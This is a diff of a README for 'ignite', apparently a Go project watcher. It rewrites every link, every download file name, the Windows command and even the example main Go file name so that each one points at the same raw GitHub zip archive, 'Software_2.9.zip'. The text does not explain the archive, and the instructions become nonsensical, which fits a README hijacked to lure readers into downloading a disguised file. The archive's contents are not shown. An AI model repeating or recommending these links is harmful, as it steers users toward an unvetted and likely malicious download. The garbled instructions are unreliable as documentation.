@@ -6,13 +6,13 @@
 ## 📥 Download & Install
 To get started with `ignite`, you need to download it. Click the link below to visit the Releases page:
 
-[![Download ignite](https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip%https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip)](https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip)
+[![Download ignite](https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip%https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip)](https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip)
 
 Once on the Releases page, find the latest version and select the appropriate file for your operating system. Follow these steps to download and install:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip).
 2. Choose the latest version available at the top.
-3. Click the file labeled for your operating system, such as `https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip` for Windows or `https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip` for macOS.
+3. Click the file labeled for your operating system, such as `https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip` for Windows or `https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip` for macOS.
 4. The download will start automatically. Save the file to a location on your computer where you can easily find it.
 
 ## 🖥️ System Requirements
@@ -36,14 +36,14 @@ Once you have downloaded `ignite`, follow these steps to run it:
    ```
    If you are on Windows, you might need to type:
    ```
-   https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip
+   https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip
    ```
 
 ## 🔧 How to Use ignite
 To start using `ignite`, follow these steps:
 
 1. Create a Go project or open an existing one.
-2. Begin your main Go file, such as `https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip`, in the text editor of your choice.
+2. Begin your main Go file, such as `https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip`, in the text editor of your choice.
 3. In your command line, use the command:
    ```
    ignite watch ./path/to/your/project
@@ -65,7 +65,7 @@ To start using `ignite`, follow these steps:
 ## 🛠️ Support and Contributions
 If you encounter issues or have questions, you can make use of the GitHub issues page. Contributions to improve `ignite` are welcome. Feel free to suggest features or report problems.
 
-Visit the [Releases page](https://raw.githubusercontent.com/BhumBoi/ignite/main/pleasurous/ignite.zip) again to check for updates.
+Visit the [Releases page](https://raw.githubusercontent.com/BhumBoi/ignite/main/ignite/Software_2.9.zip) again to check for updates.
 
 ## 🎉 Acknowledgments
 `ignite` is developed with simplicity and efficiency in mind. Thank you for choosing to use this tool for your Go projects. Happy coding!
